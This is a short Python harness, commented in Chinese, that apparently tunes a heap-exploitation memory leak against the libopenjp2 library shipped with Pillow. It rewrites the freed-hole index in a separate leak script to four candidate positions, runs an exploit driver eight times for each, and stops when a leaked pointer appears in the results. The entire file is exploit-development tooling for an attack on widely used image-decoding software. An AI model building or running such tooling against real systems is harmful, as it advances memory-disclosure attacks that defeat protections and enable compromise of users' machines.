#!/usr/bin/env python3
# 释放点扫描器：依次把 leak_v7.py 的释放洞下标换成 4 个候选位置，每个跑 8 次
import os, re, subprocess, sys

PD = '/usr/local/lib/python3.12/dist-packages/pillow.libs/libopenjp2-0ec72a70.so.2.5.4'
subprocess.run(['cp', PD + '.orig', PD])          # 确保用官方库（非插桩）
SRC = '/tmp/leak_v7.py'
RES = '/tmp/leak_result6.txt'

s0 = open(SRC).read()
if not re.search(r'^holeD = good\[.*?\]\[0\]', s0, flags=re.M):
    print('[!] 找不到 holeD 行', flush=True)
    sys.exit(2)

VARIANTS = ['len(good) // 3', '2 * len(good) // 3', '5', 'len(good) - 6']
for idx in VARIANTS:
    s = re.sub(r'^holeD = good\[.*?\]\[0\]', 'holeD = good[%s][0]' % idx, s0, flags=re.M)
    open(SRC, 'w').write(s)
    print('===== 释放点 good[%s] =====' % idx, flush=True)
    log = '/tmp/sweep_%s.log' % re.sub(r'\W+', '_', idx)
    with open(log, 'w') as f:
        subprocess.run(['python3', '-u', '/tmp/leak_driver.py', '8'],
                       stdout=f, stderr=subprocess.STDOUT)
    hit = False
    if os.path.exists(RES):
        body = open(RES, errors='replace').read()
        hit = ('指针=' in body)
    else:
        body = ''
    if hit:
        print('*** HIT @ good[%s] ***' % idx, flush=True)
        print(body, flush=True)
        sys.exit(0)
    out = open(log, errors='replace').read()
    tries = [x for x in out.splitlines() if x.startswith('尝试')]
    print('  已完成 %d 次；末3条：' % len(tries), flush=True)
    for l in tries[-3:]:
        print('    ' + l[:100], flush=True)

print('*** 4 个释放点全部未命中 ***', flush=True)
sys.exit(1)